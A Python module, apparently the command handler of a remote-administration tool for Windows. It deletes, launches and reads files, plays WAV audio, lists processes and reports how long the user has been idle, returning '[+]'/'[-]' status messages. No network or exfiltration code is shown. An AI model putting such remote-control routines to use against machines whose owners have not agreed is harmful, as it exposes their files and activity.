import os
import wmi
import shutil
import soundfile as sf
import sounddevice as sd
from ctypes import Structure, windll, c_uint, sizeof, byref

class LASTINPUTINFO(Structure):
    _fields_ = [
        ('cbSize', c_uint),
        ('dwTime', c_uint),
    ]

class manager():
    already_playing = False

    def delete_path(self, path):
        try:
            if os.path.isdir(path):
                shutil.rmtree(path)
            elif os.path.isfile(path):
                os.remove(path)

            return "[+] Successfully deleted: {} from the system.".format(path)
        except Exception as e:
            return "[-] Error deleting: {} from the system: {}".format(path, e)

    def launch_file(self, path):
        try:
            if os.path.exists(path) and os.path.isfile(path):
                os.startfile(path)

                return "[+] Successfully launching: {}.".format(path)
            else:
                return "[-] The path you specified is not valid."
        except Exception as e:
            return "[-] Couldn't launch: {}, {}".format(path, e)

    def read_content_of_file(self, path):
        try:
            if os.path.exists(path) and os.path.isfile(path):
                with open(path, "r") as file:
                    file_data = file.read()
                    if len(file_data) == 0:
                        return "File is Empty!\n"
                    else:
                        data = "Content of the file:\n{}\n".format(file_data)                        

                return data
            else:
                return "[-] The path you specified is not valid."
        except Exception as e:            
            return "[-] Couldn't read: {}'s content: {}.".format(path, e)
    
    def play_sound(self, path, should_stop):
        try:
            if should_stop:
                if self.already_playing:
                    sd.stop()
                    self.already_playing = False

                    return "[+] Stopped playing the audio."
                else:
                    return "[-] You can't stop the music, because nothing is being played."

            if os.path.exists(path) and os.path.isfile(path):
                last_index = len(path)
                extension = path[last_index - 4:last_index]
                
                if extension == ".wav":
                    self.already_playing = True
                    data, fs = sf.read(path, dtype='float32')  
                    
                    sd.play(data, fs)
                    return "[+] Playing: {}\nWrite stsound to stop.\n".format(path)
                else:
                    return "[-] The path you specified is not of type wav."
            else:
                return "[-] The path you specified is invalid."
        except Exception as e:
            return "[-] Couldn't play: {}, {}".format(path, e)

    def get_processes(self):
        try:
            f = wmi.WMI()
            
            data = "PID\t   Name\n---\t   ----"             
            for process in f.Win32_Process():                                
                data += f"\n{process.ProcessId:<10} {process.Name}"

            return data
        except Exception as e:
            return "[-] Couldn't get the list of processes running: {}".format(e)

    def get_idle_duration(self):
        try:
            lastInputInfo = LASTINPUTINFO()
            lastInputInfo.cbSize = sizeof(lastInputInfo)
            windll.user32.GetLastInputInfo(byref(lastInputInfo))
            millis = windll.kernel32.GetTickCount() - lastInputInfo.dwTime

            return "Idle time: {}".format(millis / 1000.0)
        except Exception as e:
            return "[-] Couldn't get the idle time: {}.".format(e)